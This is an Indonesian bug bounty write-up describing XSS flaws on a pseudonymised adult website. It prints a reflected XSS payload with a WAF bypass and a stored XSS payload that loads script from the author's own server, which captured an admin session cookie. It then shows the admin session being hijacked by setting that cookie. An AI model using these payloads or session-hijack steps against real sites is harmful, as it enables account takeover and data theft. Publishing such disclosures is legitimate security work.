---
featured_image: "/uploads/abay/screenshot-situs-haram.png"
author_description: Saya Akbar Kustirama, orang-orang memanggil saya Abay. Saya sering
  membuat sesuatu hanya kesenangan pribadi. Biasanya saya tidak bisa “hidup” tanpa
  Gudang Garam. Beberapa kali mengubah ide-ide menarik menjadi hal-hal yang indah—kadang
  berantakan. Saya juga kontributor dari situs dengan nama Codelatte, yang merupakan
  blog berbahasa Indonesia yang membahas pemrograman situs web.
author_avatar: "/uploads/abay/yha.webp"
author_facebook: https://facebook.com
author_twitter: https://twitter.com
author_instagram: https://instagram.com
author_donation: https://blog.hackstreet.id
author_web: https://kustirama.id/
title: Mengintip Dashboard Admin Situs Haram
date: 2022-12-17T17:00:00+07:00
author: abay
tags:
- xss
- bugbounty
- writeup
categories: bug bounty

---
Kegiatan ini berawal dari salah satu teman yang memberi informasi bahwa dia baru saja mendapatkan _bounty_ dari salah satu situs haram yang ada di luar sana. Singkat cerita, saya mencoba mencari peruntungan serupa dengan mencari situs sejenis di pencarian Google dengan harapan menemukan situs yang cukup “umum” yang secara fitur punya banyak bagian yang bisa saya coba untuk masuki.

Untuk mempermudah dan agar saya tidak perlu menyebut nama situsnya, mari kita sebut situs ini sebagai `situsharam.com`.

![Mengintip Dashboard Admin Situs Haram](https://akbar.kustirama.id/mengintip-dashboard-admin-situs-haram/images/screenshot-situs-haram.png)

Setelah mencoba beberapa fitur seperti list _actors/actress_, kategori, pencarian, serta fitur yang membutuhkan autentikasi pengguna seperti _edit profile_, _like_, _comment_ dan semacamnya, saya menemukan beberapa celah yang detailnya akan saya jelaskan di bawah ini.

## Reflected XSS pada Halaman Pencarian

Celah pertama adalah _Reflected XSS_ yang saya temukan di halaman pencarian. Payload yang saya gunakan adalah:

    asd"><ScRiPt%20>alert(1);<%2fscript>

Saat mencoba, saya menemukan bahwa karakter `/` diblok oleh WAF sehingga saya coba untuk mem-bypass rule tersebut menggunakan karakter `%2f`. Dari temuan ini saya bisa menggunakan _payload_ yang sudah disisipi _script_ untuk mencuri `cookie` pengguna.

Pada kasus di dunia nyata, seorang penyerang akan menyisipkan javascript yang bertujuan untuk mencuri _cookie_ pengguna dan beberapa data lain, lalu mengirimnya pada server penyerang.

Untuk melakukan ini, penyerang perlu mengirim URL (yang sudah disisipi _payload_) ke pengguna lain atau pemilik/admin dari situs ini. Lalu penyerang akan menggunakan data tersebut untuk masuk di situs target tanpa menggunakan _username_ dan _password_.

![Mengintip Dashboard Admin Situs Haram](https://akbar.kustirama.id/mengintip-dashboard-admin-situs-haram/images/screenshot-reflected-xss-pencarian.jpg)

## Stored XSS pada Profile

Saya rasa kebanyakan _bug bounty hunter_ (termasuk saya) akan mencoba memasukkan _payload_ ke setiap form yang kami temui. Dengan modal “penting yakin”, saya mengisi `"><h1>asdf</h1>"` pada kolom nama di halaman _Edit Profile_.

Setelah menyimpan perubahan tersebut, kode HTML yang saya sisipkan dibaca oleh situs sehingga menandakan adanya potensi untuk _Stored XSS_.

![](https://akbar.kustirama.id/mengintip-dashboard-admin-situs-haram/images/screenshot-html-injection-profile.jpg)

Saya melanjutkan dengan memasukkan payload:

    "><script src=//x.serversaya.com></script><x="

* `">` = digunakan untuk keluar dari input form (`<input>`)
* `<script src=//x.serversaya.com></script>` = digunakan untuk memanggil script dari server saya ([ezXSS](https://github.com/ssl/ezXSS))
* `<x="` = digunakan untuk membuka kembali hasil escape dari input form, sehingga tidak ada “ type=”text” dst seperti screenshot di atas

Setelah beberapa waktu menunggu, saya mendapat notifikasi bahwa payload di atas ditemukan di domain lain (cp.situslain.com) yang mana adalah dashboard admin dari `situsharam.com`. Berikut detail laporan dari [ezXSS](https://github.com/ssl/ezXSS) saat payload saya ditemukan di dashboard admin (klik gambar untuk memperbesar).

![Mengintip Dashboard Admin Situs Haram](https://akbar.kustirama.id/mengintip-dashboard-admin-situs-haram/images/screenshot-xss-dashboard-admin-situs-haram.jpg)

Pada tangkapan layar di atas, terlihat ada `cookie` admin yang tertangkap oleh kode javascript yang saya panggil. Saya akan mencoba menggunakan Cookie tersebut untuk masuk ke [`https://cp.situslain.com/user/edit/`](https://cp.situslain.com/user/edit/ "https://cp.situslain.com/user/edit/")`{userid}`.

Ketika mengakses [`https://cp.situslain.com/user/edit/`](https://cp.situslain.com/user/edit/ "https://cp.situslain.com/user/edit/")`{userid}`, saya dialihkan ke halaman login [`https://cp.situslain.com/user/login`](https://cp.situslain.com/user/edit/ "https://cp.situslain.com/user/edit/").

![Mengintip Dashboard Admin Situs Haram](https://akbar.kustirama.id/mengintip-dashboard-admin-situs-haram/images/screenshot-login-page-set-cookie.jpg)

Selanjutnya saya mencoba _set cookie_ manual melalui `Console` pada `inspect element` dengan cara memasukkan kode javascript. Cookie ini berasal dari laporan ezXSS di atas:

    document.cookie = 'PHPSESSID=lot4#######################';

Setelah Cookie di-set, saya mencoba mengulang lagi dan akhirnya berhasil membuka halaman [`https://cp.situslain.com/user/edit/`](https://cp.situslain.com/user/edit/ "https://cp.situslain.com/user/edit/")`{userid}`.

![Mengintip Dashboard Admin Situs Haram](https://akbar.kustirama.id/mengintip-dashboard-admin-situs-haram/images/screenshot-dashboard-admin-situs-haram.jpg)

**Disclaimer**  
_Level_ dan _Credit_ yang tertera pada screenshot adalah pemberian admin (apresiasi, menurut istilah sekarang) setelah saya melaporkan temuan ini. Proses pelaporan tidak akan saya jelaskan di sini, hehe.

Sekian artikel “Mengintip Dashboard Admin Situs Haram”. Semoga ada yang bisa dipelajari dari artikel ini, selain akhirnya kita tahu bentuk halaman dashboard admin situs haram. Sampai jumpa di artikel selanjutnya.